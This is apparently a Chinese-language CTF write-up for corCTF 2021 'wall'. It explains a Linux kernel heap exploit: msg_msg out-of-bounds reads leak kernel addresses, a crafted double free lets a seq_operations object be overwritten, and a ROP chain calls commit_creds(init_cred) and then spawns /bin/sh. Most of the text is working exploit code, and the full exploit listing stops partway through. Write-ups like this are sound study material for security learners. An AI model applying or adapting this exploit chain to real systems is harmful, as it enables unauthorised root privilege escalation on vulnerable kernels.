<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><ul>
<li>可以对0x40~0x1000以内的obj kfree两次(或者释放一次但是拥有写功能)</li>
<li>内核版本小于5.14，因为如果超过了5.14，msg就不从kmalloc-xxx中拿obj了，而是从kmalloc-cg-xxx中拿obj了，如果可以doublefree的obj是通过<code>GFP_KERNEL</code>kmalloc到的，那msg就完全申请不到这个obj了。</li>
<li>开启了<code>MSG_COPY</code>功能</li>
</ul>
<h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>就以corctf2021的wall作为例子（本来相用n1的praymoon做例子的，结果调试了一下午才发现版本太高了msg没法用了。），简而言之可以把wall看做只能释放两次同一个0x40大小的obj的抽象模型。</p>
<h3 id="一-泄露地址"><a href="#一-泄露地址" class="headerlink" title="一.泄露地址"></a>一.泄露地址</h3><p>首先是利用ko申请一个0x40的obj然后把他释放掉</p>
<p>在这个例子中我打算利用msg构造出doublefree的0x20的obj,这样就可以使用<code>seq_operations</code>劫持程序流来提升权限，那就得根据0x20精心构造msg了，我的构造如下</p>
<p>使用了两个消息队列，分别是msg_id[0]和msg_id[1],这个msg_id[0]的msg是刚刚我们释放的obj，然后再使用ko把这个obj再释放一次，由于使用的是slab分配算法，所以释放后obj的内容并不会发生改变，然后再使用<code>setxattr</code>把这个obj申请回来修改其中的<code>m_ts</code>字段，然后再使用msg_id[0]读这个msg,就能越界读到msg_id[1]的第一个msg了，主要记录的就是msg_id[1]的第二个msg的起始地址<code>ll_next</code>和msg_id[1]的msg_queue<code>ll_prev</code>，然后还有几率读到<code>error_injection_list</code>，利用这个泄露内核地址。然后再通过msg_id[1]的第二个msg的<code>next</code>字段读到一个0x20的obj的地址，即target_obj。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221120171926473.png" alt="image-20221120171926473"></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">add_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    dup_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,INBOUND);</span><br><span class="line">    msg-&gt;mtype=<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x61</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">0</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x62</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x10</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">2</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x63</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">3</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x64</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0xfe8</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    msg-&gt;mtype=<span class="number">4</span>;</span><br><span class="line">    <span class="built_in">memset</span>(msg-&gt;mtext,<span class="number">0x65</span>,<span class="number">0x1000</span>);</span><br><span class="line">    send_msg(msg_id[<span class="number">1</span>],msg,<span class="number">0x1008</span>,IPC_NOWAIT);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] doublefree\n&quot;</span>);</span><br><span class="line">    del_rule(fd,<span class="number">0</span>,OUTBOUND);</span><br><span class="line">    msg_header *fake_msg_header=(msg_header *)<span class="built_in">malloc</span>(<span class="number">0x40</span>);</span><br><span class="line">    fake_msg_header-&gt;ll_next=(<span class="keyword">void</span> *)<span class="number">0x4141414141414141</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=(<span class="keyword">void</span> *)<span class="number">0x4242424242424242</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1000</span><span class="number">-0x30</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1000</span><span class="number">-0x30</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>((!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;bbbbbbbbbbbbbbbb&quot;</span>,<span class="number">0x10</span>))&amp;&amp;(!<span class="built_in">queue</span>))&#123;</span><br><span class="line">            <span class="built_in">queue</span>=re_buf[i<span class="number">-5</span>];</span><br><span class="line">            page_msg=re_buf[i<span class="number">-6</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(((re_buf[i]&amp;<span class="number">0xffff</span>)==<span class="number">0x1520</span>)&amp;&amp;(!kernelbase))&#123; <span class="comment">//error_injection_list</span></span><br><span class="line">            kernelbase=re_buf[i]<span class="number">-0xc41520</span>;</span><br><span class="line">            init_task=kernelbase+<span class="number">0xc124c0</span>;</span><br><span class="line">            init_cred=kernelbase+<span class="number">0xc33060</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">queue</span>&amp;&amp;kernelbase)&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m msg_queue_addr:%p \e[0m\n&quot;</span>,<span class="built_in">queue</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m page_msg_addr:%p \e[0m\n&quot;</span>,page_msg);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m kernelbase_addr:%p \e[0m\n&quot;</span>,kernelbase);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_task_addr:%p \e[0m\n&quot;</span>,init_task);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m init_cred_addr:%p \e[0m\n&quot;</span>,init_cred);</span><br><span class="line">    <span class="keyword">if</span>((!<span class="built_in">queue</span>)||(!kernelbase))&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;get queue fail or kernelbase fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x1050</span>;</span><br><span class="line">    fake_msg_header-&gt;next=page_msg<span class="number">-0x10</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0x1050</span>,<span class="number">0</span>, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x2000</span>/<span class="number">0x8</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;re_buf[i],<span class="string">&quot;cccccccccccccccc&quot;</span>,<span class="number">0x10</span>))&#123;</span><br><span class="line">            target_obj=re_buf[i<span class="number">-2</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\e[40;32m target_obj_addr:%p \e[0m\n&quot;</span>,target_obj);</span><br></pre></td></tr></table></figure>

<h3 id="二-任意free"><a href="#二-任意free" class="headerlink" title="二.任意free"></a>二.任意free</h3><p>到这里我们已经知道了<code>target_obj</code>的地址了，这个obj的大小是0x20的，当我们使用msgrcv()的时候，如果不使用<code>MSG_COPY</code>的话，查找到的<code>msg</code>是会被脱链然后free掉的，所以如果把msg_id[0]的next填上target_obj的地址，那msgrcv<code>msg_id[0]</code>的时候就把target_obj给释放掉了，但是其实target_obj还在msg_id[1]的第二个msg的段上，所以还可以被free一次，这就可以构造出doublefree了。构造如下。</p>
<p>注意内核是会检查doublefree的，但是检查不是很严格，就和glibc的fastbin一样，所以构造出A-&gt;B-&gt;A就好了。剩下两个msg就是为了构造<code>A-&gt;B-&gt;A</code>的。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221120173429967.png" alt="image-20221120173429967"></p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fake_msg_header-&gt;ll_next=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;ll_prev=<span class="built_in">queue</span>;</span><br><span class="line">    fake_msg_header-&gt;m_type=<span class="number">1</span>;</span><br><span class="line">    fake_msg_header-&gt;m_ts=<span class="number">0x10</span>;</span><br><span class="line">    fake_msg_header-&gt;next=target_obj;</span><br><span class="line">    fake_msg_header-&gt;security=<span class="number">0</span>;</span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;msg&quot;</span>, fake_msg_header, <span class="number">0x40</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">2</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0x1008</span>,<span class="number">4</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(re_buf,<span class="number">0</span>,<span class="number">0x2000</span>);</span><br><span class="line">    get_msg(msg_id[<span class="number">1</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">3</span>,IPC_NOWAIT | MSG_NOERROR);</span><br><span class="line"></span><br><span class="line">    get_msg(msg_id[<span class="number">0</span>],re_buf,<span class="number">0xfe8</span>,<span class="number">1</span>,IPC_NOWAIT | MSG_NOERROR);</span><br></pre></td></tr></table></figure>



<h3 id="三-劫持程序流"><a href="#三-劫持程序流" class="headerlink" title="三.劫持程序流"></a>三.劫持程序流</h3><p>现在0x20的slab的freelist上就有这样的链子<code>A-&gt;B-&gt;A</code>,这样就好办了，先申请一次<code>seq_operation</code>然后第三次申请又能申请这个seq_operation的obj了，就能修改函数指针劫持程序流了。</p>
<p>代码如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">seq_fd=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(seq_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> tmp=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(tmp&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        err_exit(<span class="string">&quot;open seq fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> seq_operation[<span class="number">4</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    add_rsp_0x108_pop_3=add_rsp_0x108_pop_3-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    pop_rdi_ret=pop_rdi_ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    commit_cred=commit_cred-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    kpti_addr=kpti_addr-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line">    ret=ret-vmlinux_nokaslr_addr+kernelbase;</span><br><span class="line"></span><br><span class="line">    seq_operation[<span class="number">0</span>]=<span class="number">0xffffffff81019d8b</span>;</span><br><span class="line"></span><br><span class="line">    setxattr(<span class="string">&quot;/exp&quot;</span>, <span class="string">&quot;seq&quot;</span>, seq_operation, <span class="number">0x20</span>, <span class="number">0</span>);</span><br><span class="line">    __asm__(</span><br><span class="line">            <span class="string">&quot;mov r15, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r14, init_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r13, commit_cred;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r12, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbp, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rbx, pop_rdi_ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r11, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r10, ret;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r9,  kpti_addr;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov r8,  0xbeefdead;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rax, 0;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov rdx, 0x200;&quot;</span></span><br><span class="line">            <span class="string">&quot;syscall;&quot;</span></span><br><span class="line">        );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;uid:%d\n&quot;</span>,getuid());</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;byteswap.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/timerfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/reboot.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/xattr.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> page_size 0x1000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ADD_RULE 0x1337babe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DELETE_RULE 0xdeadbabe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> EDIT_RULE 0x1337beef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHOW_RULE 0xdeadbeef</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DUP_RULE 